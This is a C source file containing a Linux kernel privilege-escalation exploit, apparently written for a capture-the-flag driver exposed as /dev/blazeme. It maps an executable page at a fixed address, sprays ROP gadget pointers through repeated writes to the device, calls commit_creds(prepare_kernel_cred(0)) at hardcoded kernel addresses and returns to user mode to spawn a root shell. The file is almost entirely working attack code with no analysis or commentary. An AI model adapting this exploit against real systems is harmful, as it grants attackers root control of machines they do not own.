/*
 * gcc -O0 -static exploit.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>

struct trap_frame{
        void *rip;
        uint64_t cs;
        uint64_t rflags;
        void *rsp;
        uint64_t ss;
};
struct trap_frame tf;

void launch_shell() {
        getuid();
        system("/bin/sh");
}

void prepare_tf(){
        asm(    "movq %%cs, %0\n"
                "movq %%ss, %1\n"
                "movq %%rsp, %3\n"
                "pushfq\n"
                "popq %2\n"
                : "=r"(tf.cs), "=r"(tf.ss), "=r"(tf.rflags), "=r"(tf.rsp) :: "memory"
        );
        tf.rip = &launch_shell;
        tf.rsp -= 1024;
}

#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void *) KERNCALL = (void *)0xffffffff81063960;
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *)0xffffffff81063b50;

void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm(    "swapgs\n"
                "mov $tf,%rsp\n"
                "iretq\n"
        );
}

int main () {
  unsigned long pointers[8];

  unsigned int codeBytes = 4096;
  void * virtualCodeAddress = 0;

  virtualCodeAddress = mmap(
                            (void *)0x5dffc515,
                            codeBytes,
                            PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_ANONYMOUS | MAP_PRIVATE,
                            0,
                            0);

  unsigned char * tempCode = (unsigned char *) 0x5dffc515;

  unsigned long low = (unsigned long)&payload & 0xffffffff;
  unsigned long high = ((unsigned long)&payload >> 32) & 0xffffffff;

  // mov address to [rsp] and return
  // I know its hackish and all but it works!
  tempCode[0] = 0xc7;
  tempCode[1] = 0x04;
  tempCode[2] = 0x24;

  tempCode[3] = (low) & 0xff;
  tempCode[4] = (low >> 8) & 0xff;
  tempCode[5] = (low >> 16) & 0xff;
  tempCode[6] = (low >> 24) & 0xff;
  tempCode[7] = 0xc7;
  tempCode[8] = 0x44;
  tempCode[9] = 0x24;
  tempCode[10] = 0x04;

  tempCode[11] = (high) & 0xff;
  tempCode[12] = (high >> 8) & 0xff;
  tempCode[13] = (high >> 16) & 0xff;
  tempCode[14] = (high >> 24) & 0xff;

  tempCode[15] = 0xc3;

  // rop gadget
  for(int i = 0; i < 8; i++) {
    pointers[i] = 0xffffffff814b4522; //  add eax, ebp; push 0x5dffc515; ret
  }

  char spray[64];
  strncpy(spray, "AA", 2);
  strncpy(&spray[2], (const char *)pointers, 62);

  // don't forget this!
  prepare_tf();


  printf("Sparying pointers\n");


  int fd = open("/dev/blazeme", O_RDWR);
  while (1) {
    write(fd, spray, 64);;
  }

  return 0;
}
